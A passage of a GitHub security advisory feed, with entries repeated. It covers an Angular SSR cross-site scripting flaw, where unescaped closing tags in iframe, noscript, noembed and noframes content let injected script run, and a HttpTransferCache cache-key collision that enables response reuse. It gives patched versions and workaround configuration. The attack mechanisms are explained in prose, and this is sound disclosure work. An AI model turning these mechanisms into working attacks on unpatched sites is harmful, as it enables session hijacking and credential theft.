<li><a href="https://github.com/advisories/GHSA-vpx6-8pjr-4g3v">https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:14:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/platform-server] Angular SSR: Missing Fallback Raw-Content Serialization Escaping leads to Cross-Site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</id>
        <link href="https://github.com/advisories/GHSA-vpx6-8pjr-4g3v"/>
        <updated>2026-08-03T16:14:45.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability exists in <code>@angular/platform-server</code>'s DOM emulation dependency (<code>domino</code>) when serializing the content of fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, and <code>&lt;noscript&gt;</code>).</p>
<p>When rendering dynamic text content inside fallback raw-content elements via template bindings, the template engine expects the browser to render the content safely. Under Server-Side Rendering (SSR), <code>domino</code> is configured with scripting enabled, meaning these elements are treated as raw-text elements.</p>
<p>However, <code>domino</code>'s serializer previously did not escape text nodes within fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>) during DOM serialization. As a result, any occurrence of closing tags in the bound dynamic text was not escaped.</p>
<p>The unescaped closing tag could be serialized directly into the output HTML. When parsed by a browser or re-parsed during SSR post-processing without preserving raw-content parser state, an injected closing tag closes the element early, allowing an injected script block to execute in the user's browser context, causing same-origin Cross-Site Scripting (XSS).</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to perform same-origin Cross-Site Scripting (XSS) attacks against any user visiting an SSR-rendered page that binds user-controlled data inside fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>). This can lead to session hijacking, credentials theft, unauthorized actions on behalf of users, and defacement.</p>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.7</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot immediately update your dependencies, you can mitigate this issue using any of the following approaches:</p>
<ul>
<li><strong>Disable critical CSS inlining</strong>: Critical CSS inlining in Angular SSR post-processes the rendered HTML using <code>domino</code>. Disabling this step prevents <code>domino</code> from re-parsing and re-serializing the HTML during server-side rendering.<ul>
<li>In <code>angular.json</code>, set <code>inlineCritical</code> to <code>false</code> under style optimization options:<pre><code class="language-json">{
  "projects": {
    "my-app": {
      "architect": {
        "build": {
          "builder": "@angular/build:application",
          "options": {
            "optimization": {
              "styles": {
                "inlineCritical": false
              }
            }
          }
        }
      }
    }
  }
}
</code></pre>
</li>
<li>When rendering programmatically with <code>CommonEngine</code>, set <code>inlineCriticalCss: false</code> in your render options.</li>
</ul>
</li>
<li><strong>Avoid binding user-controlled values</strong> inside fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>).</li>
<li><strong>Sanitize user input</strong> placed inside these elements to explicitly strip or escape closing tags before passing it to the template.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v">https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v</a></li>
<li><a href="https://github.com/angular/angular/pull/69675">https://github.com/angular/angular/pull/69675</a></li>
<li><a href="https://github.com/angular/angular/pull/69714">https://github.com/angular/angular/pull/69714</a></li>
<li><a href="https://github.com/angular/angular/pull/69929">https://github.com/angular/angular/pull/69929</a></li>
<li><a href="https://github.com/angular/angular/pull/69930">https://github.com/angular/angular/pull/69930</a></li>
<li><a href="https://github.com/angular/domino/pull/32">https://github.com/angular/domino/pull/32</a></li>
<li><a href="https://github.com/angular/domino/commit/f88e5aa49cf2804d7c2df22ef1640eb4ec43dd56">https://github.com/angular/domino/commit/f88e5aa49cf2804d7c2df22ef1640eb4ec43dd56</a></li>
<li><a href="https://github.com/advisories/GHSA-vpx6-8pjr-4g3v">https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:14:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/platform-server] Angular SSR: Missing Fallback Raw-Content Serialization Escaping leads to Cross-Site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</id>
        <link href="https://github.com/advisories/GHSA-vpx6-8pjr-4g3v"/>
        <updated>2026-08-03T16:14:45.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability exists in <code>@angular/platform-server</code>'s DOM emulation dependency (<code>domino</code>) when serializing the content of fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, and <code>&lt;noscript&gt;</code>).</p>
<p>When rendering dynamic text content inside fallback raw-content elements via template bindings, the template engine expects the browser to render the content safely. Under Server-Side Rendering (SSR), <code>domino</code> is configured with scripting enabled, meaning these elements are treated as raw-text elements.</p>
<p>However, <code>domino</code>'s serializer previously did not escape text nodes within fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>) during DOM serialization. As a result, any occurrence of closing tags in the bound dynamic text was not escaped.</p>
<p>The unescaped closing tag could be serialized directly into the output HTML. When parsed by a browser or re-parsed during SSR post-processing without preserving raw-content parser state, an injected closing tag closes the element early, allowing an injected script block to execute in the user's browser context, causing same-origin Cross-Site Scripting (XSS).</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to perform same-origin Cross-Site Scripting (XSS) attacks against any user visiting an SSR-rendered page that binds user-controlled data inside fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>). This can lead to session hijacking, credentials theft, unauthorized actions on behalf of users, and defacement.</p>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.7</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot immediately update your dependencies, you can mitigate this issue using any of the following approaches:</p>
<ul>
<li><strong>Disable critical CSS inlining</strong>: Critical CSS inlining in Angular SSR post-processes the rendered HTML using <code>domino</code>. Disabling this step prevents <code>domino</code> from re-parsing and re-serializing the HTML during server-side rendering.<ul>
<li>In <code>angular.json</code>, set <code>inlineCritical</code> to <code>false</code> under style optimization options:<pre><code class="language-json">{
  "projects": {
    "my-app": {
      "architect": {
        "build": {
          "builder": "@angular/build:application",
          "options": {
            "optimization": {
              "styles": {
                "inlineCritical": false
              }
            }
          }
        }
      }
    }
  }
}
</code></pre>
</li>
<li>When rendering programmatically with <code>CommonEngine</code>, set <code>inlineCriticalCss: false</code> in your render options.</li>
</ul>
</li>
<li><strong>Avoid binding user-controlled values</strong> inside fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>).</li>
<li><strong>Sanitize user input</strong> placed inside these elements to explicitly strip or escape closing tags before passing it to the template.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v">https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v</a></li>
<li><a href="https://github.com/angular/angular/pull/69675">https://github.com/angular/angular/pull/69675</a></li>
<li><a href="https://github.com/angular/angular/pull/69714">https://github.com/angular/angular/pull/69714</a></li>
<li><a href="https://github.com/angular/angular/pull/69929">https://github.com/angular/angular/pull/69929</a></li>
<li><a href="https://github.com/angular/angular/pull/69930">https://github.com/angular/angular/pull/69930</a></li>
<li><a href="https://github.com/angular/domino/pull/32">https://github.com/angular/domino/pull/32</a></li>
<li><a href="https://github.com/angular/domino/commit/f88e5aa49cf2804d7c2df22ef1640eb4ec43dd56">https://github.com/angular/domino/commit/f88e5aa49cf2804d7c2df22ef1640eb4ec43dd56</a></li>
<li><a href="https://github.com/advisories/GHSA-vpx6-8pjr-4g3v">https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:14:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/platform-server] Angular SSR: Missing Fallback Raw-Content Serialization Escaping leads to Cross-Site Scripting (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</id>
        <link href="https://github.com/advisories/GHSA-vpx6-8pjr-4g3v"/>
        <updated>2026-08-03T16:14:45.000Z</updated>
        <content type="html"><![CDATA[<p>A Cross-Site Scripting (XSS) vulnerability exists in <code>@angular/platform-server</code>'s DOM emulation dependency (<code>domino</code>) when serializing the content of fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, and <code>&lt;noscript&gt;</code>).</p>
<p>When rendering dynamic text content inside fallback raw-content elements via template bindings, the template engine expects the browser to render the content safely. Under Server-Side Rendering (SSR), <code>domino</code> is configured with scripting enabled, meaning these elements are treated as raw-text elements.</p>
<p>However, <code>domino</code>'s serializer previously did not escape text nodes within fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>) during DOM serialization. As a result, any occurrence of closing tags in the bound dynamic text was not escaped.</p>
<p>The unescaped closing tag could be serialized directly into the output HTML. When parsed by a browser or re-parsed during SSR post-processing without preserving raw-content parser state, an injected closing tag closes the element early, allowing an injected script block to execute in the user's browser context, causing same-origin Cross-Site Scripting (XSS).</p>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows an attacker to perform same-origin Cross-Site Scripting (XSS) attacks against any user visiting an SSR-rendered page that binds user-controlled data inside fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>). This can lead to session hijacking, credentials theft, unauthorized actions on behalf of users, and defacement.</p>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.7</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot immediately update your dependencies, you can mitigate this issue using any of the following approaches:</p>
<ul>
<li><strong>Disable critical CSS inlining</strong>: Critical CSS inlining in Angular SSR post-processes the rendered HTML using <code>domino</code>. Disabling this step prevents <code>domino</code> from re-parsing and re-serializing the HTML during server-side rendering.<ul>
<li>In <code>angular.json</code>, set <code>inlineCritical</code> to <code>false</code> under style optimization options:<pre><code class="language-json">{
  "projects": {
    "my-app": {
      "architect": {
        "build": {
          "builder": "@angular/build:application",
          "options": {
            "optimization": {
              "styles": {
                "inlineCritical": false
              }
            }
          }
        }
      }
    }
  }
}
</code></pre>
</li>
<li>When rendering programmatically with <code>CommonEngine</code>, set <code>inlineCriticalCss: false</code> in your render options.</li>
</ul>
</li>
<li><strong>Avoid binding user-controlled values</strong> inside fallback raw-content elements (<code>&lt;iframe&gt;</code>, <code>&lt;noembed&gt;</code>, <code>&lt;noframes&gt;</code>, <code>&lt;noscript&gt;</code>).</li>
<li><strong>Sanitize user input</strong> placed inside these elements to explicitly strip or escape closing tags before passing it to the template.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v">https://github.com/angular/angular/security/advisories/GHSA-vpx6-8pjr-4g3v</a></li>
<li><a href="https://github.com/angular/angular/pull/69675">https://github.com/angular/angular/pull/69675</a></li>
<li><a href="https://github.com/angular/angular/pull/69714">https://github.com/angular/angular/pull/69714</a></li>
<li><a href="https://github.com/angular/angular/pull/69929">https://github.com/angular/angular/pull/69929</a></li>
<li><a href="https://github.com/angular/angular/pull/69930">https://github.com/angular/angular/pull/69930</a></li>
<li><a href="https://github.com/angular/domino/pull/32">https://github.com/angular/domino/pull/32</a></li>
<li><a href="https://github.com/angular/domino/commit/f88e5aa49cf2804d7c2df22ef1640eb4ec43dd56">https://github.com/angular/domino/commit/f88e5aa49cf2804d7c2df22ef1640eb4ec43dd56</a></li>
<li><a href="https://github.com/advisories/GHSA-vpx6-8pjr-4g3v">https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vpx6-8pjr-4g3v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T16:14:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/common] Angular: Cache-Key Ambiguity in HttpTransferCache Leading to Cross-Request Response Reuse and State Poisoning]]></title>
        <id>https://github.com/advisories/GHSA-jhpw-976m-542j</id>
        <link href="https://github.com/advisories/GHSA-jhpw-976m-542j"/>
        <updated>2026-08-03T15:59:14.000Z</updated>
        <content type="html"><![CDATA[<p>Angular's <code>HttpTransferCache</code> caches HTTP requests made during Server-Side Rendering (SSR) so that they can be reused during client-side hydration.</p>
<p>During SSR, <code>HttpTransferCache</code> previously generated identical key material for distinct request parameters when repeated values were present because repeated values were joined with commas:</p>
<pre><code class="language-ts">new HttpParams().set('role', 'user,admin')
new HttpParams().append('role', 'user').append('role', 'admin')
</code></pre>
<p>Both requests previously serialized as <code>role=user,admin</code>, allowing distinct <code>HttpClient</code> requests to produce the same transfer-cache key material.</p>
<h3 id="impact">Impact</h3>
<p>In an SSR application, this cache-key ambiguity can make a later security-sensitive <code>HttpClient</code> request receive the response from an earlier semantically different request in the same render. For example, an attacker-influenced scalar-comma request can be cached and then replayed as the response for a trusted repeated-param authorization or data request to the same URL. As a result, Angular's server-rendered output can be based on the wrong backend response because the trusted request is not dispatched. This can lead to:</p>
<ul>
<li><strong>State Poisoning</strong>: Using incorrect or attacker-influenced cached responses for subsequent application logic.</li>
<li><strong>Cross-Request Response Reuse</strong>: Reusing cached responses across requests with semantically different parameters.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.2</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade immediately, configure your <code>HttpClient</code> requests to skip transfer caching for sensitive endpoints where repeated parameter keys are used:</p>
<pre><code class="language-ts">this.http.get('/api/resource', {
  transferCache: false
});
</code></pre>
<p>Alternatively, disable the HTTP transfer cache globally in your application bootstrap config:</p>
<pre><code class="language-ts">import { provideClientHydration, withNoHttpTransferCache } from '@angular/platform-browser';

export const appConfig = {
  providers: [
    provideClientHydration(
      withNoHttpTransferCache()
    )
  ]
};
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jhpw-976m-542j">https://github.com/angular/angular/security/advisories/GHSA-jhpw-976m-542j</a></li>
<li><a href="https://github.com/angular/angular/pull/68571">https://github.com/angular/angular/pull/68571</a></li>
<li><a href="https://github.com/angular/angular/commit/6867f77ec779a0a24f6339ad6c775f444202103c">https://github.com/angular/angular/commit/6867f77ec779a0a24f6339ad6c775f444202103c</a></li>
<li><a href="https://github.com/angular/angular/commit/948a8d6831e8920b54663ec79421da95210e0e35">https://github.com/angular/angular/commit/948a8d6831e8920b54663ec79421da95210e0e35</a></li>
<li><a href="https://github.com/angular/angular/commit/a64e2883e9dc4abdac70209129be303de79e5b2b">https://github.com/angular/angular/commit/a64e2883e9dc4abdac70209129be303de79e5b2b</a></li>
<li><a href="https://github.com/angular/angular/commit/a6c7fc5c13e6e494a4c9bd8e773b8d4b2a99b20c">https://github.com/angular/angular/commit/a6c7fc5c13e6e494a4c9bd8e773b8d4b2a99b20c</a></li>
<li><a href="https://github.com/advisories/GHSA-jhpw-976m-542j">https://github.com/advisories/GHSA-jhpw-976m-542j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jhpw-976m-542j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T15:59:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/common] Angular: Cache-Key Ambiguity in HttpTransferCache Leading to Cross-Request Response Reuse and State Poisoning]]></title>
        <id>https://github.com/advisories/GHSA-jhpw-976m-542j</id>
        <link href="https://github.com/advisories/GHSA-jhpw-976m-542j"/>
        <updated>2026-08-03T15:59:14.000Z</updated>
        <content type="html"><![CDATA[<p>Angular's <code>HttpTransferCache</code> caches HTTP requests made during Server-Side Rendering (SSR) so that they can be reused during client-side hydration.</p>
<p>During SSR, <code>HttpTransferCache</code> previously generated identical key material for distinct request parameters when repeated values were present because repeated values were joined with commas:</p>
<pre><code class="language-ts">new HttpParams().set('role', 'user,admin')
new HttpParams().append('role', 'user').append('role', 'admin')
</code></pre>
<p>Both requests previously serialized as <code>role=user,admin</code>, allowing distinct <code>HttpClient</code> requests to produce the same transfer-cache key material.</p>
<h3 id="impact">Impact</h3>
<p>In an SSR application, this cache-key ambiguity can make a later security-sensitive <code>HttpClient</code> request receive the response from an earlier semantically different request in the same render. For example, an attacker-influenced scalar-comma request can be cached and then replayed as the response for a trusted repeated-param authorization or data request to the same URL. As a result, Angular's server-rendered output can be based on the wrong backend response because the trusted request is not dispatched. This can lead to:</p>
<ul>
<li><strong>State Poisoning</strong>: Using incorrect or attacker-influenced cached responses for subsequent application logic.</li>
<li><strong>Cross-Request Response Reuse</strong>: Reusing cached responses across requests with semantically different parameters.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.2</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade immediately, configure your <code>HttpClient</code> requests to skip transfer caching for sensitive endpoints where repeated parameter keys are used:</p>
<pre><code class="language-ts">this.http.get('/api/resource', {
  transferCache: false
});
</code></pre>
<p>Alternatively, disable the HTTP transfer cache globally in your application bootstrap config:</p>
<pre><code class="language-ts">import { provideClientHydration, withNoHttpTransferCache } from '@angular/platform-browser';

export const appConfig = {
  providers: [
    provideClientHydration(
      withNoHttpTransferCache()
    )
  ]
};
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jhpw-976m-542j">https://github.com/angular/angular/security/advisories/GHSA-jhpw-976m-542j</a></li>
<li><a href="https://github.com/angular/angular/pull/68571">https://github.com/angular/angular/pull/68571</a></li>
<li><a href="https://github.com/angular/angular/commit/6867f77ec779a0a24f6339ad6c775f444202103c">https://github.com/angular/angular/commit/6867f77ec779a0a24f6339ad6c775f444202103c</a></li>
<li><a href="https://github.com/angular/angular/commit/948a8d6831e8920b54663ec79421da95210e0e35">https://github.com/angular/angular/commit/948a8d6831e8920b54663ec79421da95210e0e35</a></li>
<li><a href="https://github.com/angular/angular/commit/a64e2883e9dc4abdac70209129be303de79e5b2b">https://github.com/angular/angular/commit/a64e2883e9dc4abdac70209129be303de79e5b2b</a></li>
<li><a href="https://github.com/angular/angular/commit/a6c7fc5c13e6e494a4c9bd8e773b8d4b2a99b20c">https://github.com/angular/angular/commit/a6c7fc5c13e6e494a4c9bd8e773b8d4b2a99b20c</a></li>
<li><a href="https://github.com/advisories/GHSA-jhpw-976m-542j">https://github.com/advisories/GHSA-jhpw-976m-542j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jhpw-976m-542j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T15:59:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@angular/common] Angular: Cache-Key Ambiguity in HttpTransferCache Leading to Cross-Request Response Reuse and State Poisoning]]></title>
        <id>https://github.com/advisories/GHSA-jhpw-976m-542j</id>
        <link href="https://github.com/advisories/GHSA-jhpw-976m-542j"/>
        <updated>2026-08-03T15:59:14.000Z</updated>
        <content type="html"><![CDATA[<p>Angular's <code>HttpTransferCache</code> caches HTTP requests made during Server-Side Rendering (SSR) so that they can be reused during client-side hydration.</p>
<p>During SSR, <code>HttpTransferCache</code> previously generated identical key material for distinct request parameters when repeated values were present because repeated values were joined with commas:</p>
<pre><code class="language-ts">new HttpParams().set('role', 'user,admin')
new HttpParams().append('role', 'user').append('role', 'admin')
</code></pre>
<p>Both requests previously serialized as <code>role=user,admin</code>, allowing distinct <code>HttpClient</code> requests to produce the same transfer-cache key material.</p>
<h3 id="impact">Impact</h3>
<p>In an SSR application, this cache-key ambiguity can make a later security-sensitive <code>HttpClient</code> request receive the response from an earlier semantically different request in the same render. For example, an attacker-influenced scalar-comma request can be cached and then replayed as the response for a trusted repeated-param authorization or data request to the same URL. As a result, Angular's server-rendered output can be based on the wrong backend response because the trusted request is not dispatched. This can lead to:</p>
<ul>
<li><strong>State Poisoning</strong>: Using incorrect or attacker-influenced cached responses for subsequent application logic.</li>
<li><strong>Cross-Request Response Reuse</strong>: Reusing cached responses across requests with semantically different parameters.</li>
</ul>
<h3 id="patched-versions">Patched Versions</h3>
<ul>
<li>22.0.2</li>
<li>21.2.19</li>
<li>20.3.27</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade immediately, configure your <code>HttpClient</code> requests to skip transfer caching for sensitive endpoints where repeated parameter keys are used:</p>
<pre><code class="language-ts">this.http.get('/api/resource', {
  transferCache: false
});
</code></pre>
<p>Alternatively, disable the HTTP transfer cache globally in your application bootstrap config:</p>
<pre><code class="language-ts">import { provideClientHydration, withNoHttpTransferCache } from '@angular/platform-browser';

export const appConfig = {
  providers: [
    provideClientHydration(
      withNoHttpTransferCache()
    )
  ]
};
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/angular/angular/security/advisories/GHSA-jhpw-976m-542j">https://github.com/angular/angular/security/advisories/GHSA-jhpw-976m-542j</a></li>
<li><a href="https://github.com/angular/angular/pull/68571">https://github.com/angular/angular/pull/68571</a></li>
<li><a href="https://github.com/angular/angular/commit/6867f77ec779a0a24f6339ad6c775f444202103c">https://github.com/angular/angular/commit/6867f77ec779a0a24f6339ad6c775f444202103c</a></li>
<li><a href="https://github.com/angular/angular/commit/948a8d6831e8920b54663ec79421da95210e0e35">https://github.com/angular/angular/commit/948a8d6831e8920b54663ec79421da95210e0e35</a></li>
<li><a href="https://github.com/angular/angular/commit/a64e2883e9dc4abdac70209129be303de79e5b2b">https://github.com/angular/angular/commit/a64e2883e9dc4abdac70209129be303de79e5b2b</a></li>
<li><a href="https://github.com/angular/angular/commit/a6c7fc5c13e6e494a4c9bd8e773b8d4b2a99b20c">https://github.com/angular/angular/commit/a6c7fc5c13e6e494a4c9bd8e773b8d4b2a99b20c</a></li>
<li><a href="https://github.com/advisories/GHSA-jhpw-976m-542j">https://github.com/advisories/GHSA-jhpw-976m-542j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jhpw-976m-542j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-03T15:59:13.000Z</published>
    </entry>
</feed>